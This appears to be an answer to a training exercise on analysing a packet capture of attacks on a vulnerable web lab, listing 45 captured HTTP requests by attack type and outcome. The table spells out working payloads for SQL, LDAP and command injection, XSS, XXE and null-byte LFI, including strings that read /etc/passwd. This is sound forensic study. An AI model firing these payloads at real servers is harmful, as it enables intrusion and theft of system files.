# Ответ на вопрос №6

От себя добавлю, что для анализа дампа **tcpdump_log** на Windows (*~~бывает и такое~~*), использовал `Wireshark`.

_P.S. Добро пожаловать на owasp.org_ 

## Огромное спасибо Роману @Romanbullet за ответ:


 Для упрощения исследования данного дампа трафика, воспользуемся утилитой `tshark` и отфильтруем HTTP запросы на WEB-сервер.
 
 ```
 tshark -r ./tcpdump.pcap -Y http -T fields -e http.request.full_uri
 ```
 Далее в ходе углубленного анализа ответов сервера построена таблица, представленная ниже.

Обозначения и сокращения в таблице:
 - XSS - Cross-Site Scripting
 - XXE - eXternal Entity XML
 - LFI - Local File Inclusion
 - !?  - Ответ сервера содержит чувствительную информацию об используемых программных компонентах

```---------------------------------------------------------------------------------------------------------------------------------------------------
 | №  | attack    | attack type          | request                                                                                          | success  |
 |:--:|:---------:|:--------------------:|:------------------------------------------------------------------------------------------------:|:--------:|
 | 1  | No        | -                    | GET /test1/example2.php?name=root HTTP/1.1                                                       |    -     |
 | 2  | Yes       | SQL Injection        | GET /test1/example2.php?name=root%27%20or%20%271%27=%271 HTTP/1.1                                |   No     |
 | 3  | Yes       | SQL Injection        | GET /test1/example2.php?name=root%27/\*\*/and/\*\*/%271%27=%271 HTTP/1.1                         |   No     |
 | 4  | Yes       | SQL Injection        | GET /test1/example2.php?name=root%27/\*\*/or/\*\*/%271%27=%271 HTTP/1.1                          |   Yes    |
 | 5  | No        | -                    | GET / HTTP/1.1                                                                                   |   -      |
 | 6  | Yes       | Path Traversal       | GET /dirtrav/example1.php?file=hacker.png HTTP/1.1                                               |   No     |
 | 7  | Yes       | Path Traversal       | GET /dirtrav/example2.php?file=/var/www/files/hacker.png HTTP/1.1                                |   No     |
 | 8  | Yes       | Path Traversal       | GET /dirtrav/example3.php?file=hacker HTTP/1.1                                                   |   No     |
 | 9  | No        | -                    | GET /test2/example2.php?name=hacker HTTP/1.1                                                     |   -      |
 | 10 | Yes       | XSS                  | GET /test2/example2.php?name=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1                          |   No     |
 | 11 | Yes       | XSS                  | GET /test2/example2.php?name=%3CscriPt%3Ealert(1)%3C/script%3E HTTP/1.1                          |   No     |
 | 12 | Yes       | XSS                  | GET /test2/example2.php?name=%3CscriPt%3Ealert(1)%3C/scrIpt%3E HTTP/1.1                          |   Yes    |
 | 13 | No        | -                    | GET / HTTP/1.1                                                                                   |   -      |
 | 14 | Yes       | Path Traversal       | GET /dirtrav/example1.php?file=hacker.png HTTP/1.1                                               |   No     |
 | 15 | Yes       | Path Traversal       | GET /dirtrav/example2.php?file=/var/www/files/hacker.png HTTP/1.1                                |   No     |
 | 16 | Yes       | Path Traversal       | GET /dirtrav/example3.php?file=hacker HTTP/1.1                                                   |   No     |
 | 17 | Yes       | XXE                  | GET /test4/example1.php?xml=%3Ctest%3Ehacker%3C/test%3E HTTP/1.1                                 |   No     |
 | 18 | Yes       | XXE                  | GET /test4/example1.php?xml=%3C!DOCTYPE%20foo%20[%3C!ELEMENT%20foo%20ANY%3E%3C!                  |   !?     |
 |    |           |                      | ENTITY%20xxe%20SYSTEM%20%22file:/etc/passw%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E HTTP/1.1            |          |
 | 19 | No        | -                    | GET / HTTP/1.1                                                                                   |   -      |
 | 20 | Yes       | Path Traversal       | GET /dirtrav/example1.php?file=hacker.png HTTP/1.1                                               |   No     |
 | 21 | Yes       | Path Traversal       | GET /dirtrav/example2.php?file=/var/www/files/hacker.png HTTP/1.1                                |   No     |
 | 22 | Yes       | Path Traversal       | GET /dirtrav/example3.php?file=hacker HTTP/1.1                                                   |   No     |
 | 23 | Yes       | LFI                  | GET /test6/example3.php?file=/etc/passwd HTTP/1.1                                                |   No     |
 | 24 | Yes       | LFI                  | GET /test6/example3.php?file=../../../../../etc/passwd HTTP/1.1                                  |   No     |
 | 25 | Yes       | LFI                  | GET /test6/example3.php?file=../../../../../etc/passwd%00 HTTP/1.1                               |   Yes    |
 | 26 | No        | -                    | GET /test6/example2.php HTTP/1.1                                                                 |   -      |
 | 27 | No        | -                    | GET / HTTP/1.1                                                                                   |   -      |
 | 28 | Yes       | Path Traversal       | GET /dirtrav/example1.php?file=hacker.png HTTP/1.1                                               |   No     |
 | 29 | Yes       | Path Traversal       | GET /dirtrav/example2.php?file=/var/www/files/hacker.png HTTP/1.1                                |   No     |
 | 30 | Yes       | Path Traversal       | GET /dirtrav/example3.php?file=hacker HTTP/1.1                                                   |   No     |
 | 31 | No        | -                    | GET /test5/example1.php?name=hacker HTTP/1.1                                                     |   -      |
 | 32 | No        | -                    | GET /test5/example1.php?name=hacker%22 HTTP/1.1                                                  |   -      |
 | 33 | No        | Command Injection    | GET /test5/example1.php?name=hacker%22.%27uname%20-a%27;%22 HTTP/1.1                             |   No     |
 | 34 | No        | Command Injection    | GET /test5/example1.php?name=hacker%22.(%27uname%20-a%27); HTTP/1.1                              |   !?     |
 | 35 | No        | -                    | GET / HTTP/1.1                                                                                   |   -      |
 | 36 | Yes       | Path Traversal       | GET /dirtrav/example1.php?file=hacker.png HTTP/1.1                                               |   No     |
 | 37 | Yes       | Path Traversal       | GET /dirtrav/example2.php?file=/var/www/files/hacker.png HTTP/1.1                                |   No     |
 | 38 | Yes       | Path Traversal       | GET /dirtrav/example3.php?file=hacker HTTP/1.1                                                   |   No     |
 | 39 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hacker&password=hacker HTTP/1.1                                     |   Yes    |
 | 40 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hacker&password=hacker%27%20or%20%271%27=%271 HTTP/1.1              |   Yes    |
 | 41 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hacker&password=hacker%27%20or%20%271%27=%271%20--%20r HTTP/1.1     |   Yes    |
 | 42 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hacker%27%20or%20%271%27=%271%27%20--%201&password=hacker HTTP/1.1  |   Yes    |
 | 43 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hackerhacker)(cn=*))&password=hacker HTTP/1.1                       |   !?     |
 | 44 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hackerhacker)(cn=*))%00&password=hacker HTTP/1.1                    |   Yes    |
 | 45 | Yes       | LDAP Injection       | GET /test3/example2.php?name=hacker)(cn=*))%00&password=hacker HTTP/1.1                          |   Yes    |
  ```